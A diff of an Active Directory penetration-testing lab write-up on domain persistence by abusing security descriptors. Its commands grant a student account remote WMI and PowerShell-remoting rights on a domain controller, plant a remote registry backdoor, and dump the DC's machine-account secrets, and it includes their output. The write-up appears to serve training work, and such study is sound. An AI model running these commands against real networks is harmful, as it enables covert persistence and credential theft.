@@ -1,4 +1,4 @@
-# Learning Objective 13 (Domain Persistence using ACLs | Security Descriptors)
+# Learning Objective 13 (Domain Persistence | Security Descriptors Abuse)
 
 ## Tasks
 
@@ -82,10 +82,10 @@ Cached Tickets: (1)
 
 `. C:\AD\Tools\RACE.ps1`
 
-`Set-RemoteWMI -SamAccountName student422 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose`:
+`Set-RemoteWMI -SamAccountName 'student422' -ComputerName 'dcorp-dc' -namespace 'root\cimv2' -Verbose`:
 ```
 VERBOSE: Existing ACL for namespace root\cimv2 is
-O:BAG:BAD:(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719
+O:BAG:BAD:(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)📌(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719
 815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CI;CCDCLC
 SWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917
 688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-
@@ -121,7 +121,7 @@ Now, we can execute WMI queries on the DC as `student422`.
 [SNIP]
 ```
 
-`Get-WmiObject -class win32_operatingsystem -ComputerName dcorp-dc`:
+`Get-WmiObject -class win32_operatingsystem -ComputerName 'dcorp-dc'`:
 ```
 SystemDirectory : C:\Windows\system32
 Organization    :
@@ -131,14 +131,69 @@ SerialNumber    : 00454-30000-00000-AA745
 Version         : 10.0.20348
 ```
 
-`gwmi -class win32_process -ComputerName dcorp-dc`:
+`gwmi -class win32_process -ComputerName 'dcorp-dc' | %{ $_.ProcessName }`:
+```
+[SNIP]
+
+csrss.exe
+winlogon.exe
+services.exe
+lsass.exe
+svchost.exe
+svchost.exe
+svchost.exe
+svchost.exe
+svchost.exe
+svchost.exe
+svchost.exe
+svchost.exe
+svchost.exe
+LogonUI.exe
+dwm.exe
+svchost.exe
+svchost.exe
+VSSVC.exe
+svchost.exe
+svchost.exe
+svchost.exe
+spoolsv.exe
+svchost.exe
+Microsoft.ActiveDirectory.WebServices.exe
+svchost.exe
+dfsrs.exe
+dns.exe
+ismserv.exe
+svchost.exe
+dfssvc.exe
+MsMpEng.exe
+
+[SNIP]
 ```
 
+`gwmi -Namespace 'root' -Class '__Namespace' -ComputerName 'dcorp-dc' | %{ $_.Name }`:
 ```
-
-`gwmi -class antivirusproduct -ComputerName dcorp-dc -namespace 'root\securitycenter2'`:
-```
-
+subscription
+DEFAULT
+MicrosoftDfs
+CIMV2
+msdtc
+Cli
+MicrosoftActiveDirectory
+SECURITY
+RSOP
+MicrosoftDNS
+PEH
+StandardCimv2
+WMI
+AccessLogging
+directory
+Policy
+InventoryLogging
+Interop
+Hardware
+ServiceModel
+Microsoft
+Appv
 ```
 🚩
 
@@ -215,7 +270,7 @@ In rare cases, you may get an *I/O error* while using the below command, please 
 
 **Please note that this is unstable since some patches in August 2020**.
 
-`Set-RemotePSRemoting -SamAccountName student422 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose`:
+`Set-RemotePSRemoting -SamAccountName 'student422' -ComputerName 'dcorp-dc.dollarcorp.moneycorp.local' -Verbose`:
 ```
 [dcorp-dc.dollarcorp.moneycorp.local] Processing data from remote server dcorp-dc.dollarcorp.moneycorp.local failed
 with the following error message: The I/O operation has been aborted because of either a thread exit or an application
@@ -234,9 +289,9 @@ Now, **we can run commands using PowerShell remoting on the DC without DA privil
 [SNIP]
 ```
 
-`Invoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc.dollarcorp.moneycorp.local`:
+`Invoke-Command -ScriptBlock{$env:username} -ComputerName 'dcorp-dc.dollarcorp.moneycorp.local'`:
 ```
-student422
+student422👤
 ```
 🚩
 
@@ -315,7 +370,7 @@ Cached Tickets: (1)
 
 `. C:\AD\Tools\RACE.ps1`
 
-`Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student422 -Verbose`:
+`Add-RemoteRegBackdoor -ComputerName 'dcorp-dc.dollarcorp.moneycorp.local' -Trustee 'student422' -Verbose`:
 ```
 [SNIP]
 
@@ -340,7 +395,7 @@ Now, we can retrieve machine hash of the DC as `student422`.
 
 `. C:\AD\Tools\RACE.ps1`
 
-`Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose`:
+`Get-RemoteMachineAccountHash -ComputerName 'dcorp-dc' -Verbose`:
 ```
 VERBOSE: Bootkey/SysKey : BAB78ACD91795C983AEF0534E0DB38C7
 VERBOSE: LSA Key        : BDC807FEC0BB38EB0AE338451573904220F8B69404F719BDDB03F8618E84005C
@@ -472,7 +527,7 @@ Run the below command.
 [SNIP]
 ```
 
-`gwmi -Class win32_operatingsystem -ComputerName dcorp-dc`:
+`gwmi -Class win32_operatingsystem -ComputerName 'dcorp-dc'`:
 ```
 SystemDirectory : C:\Windows\system32
 Organization    :
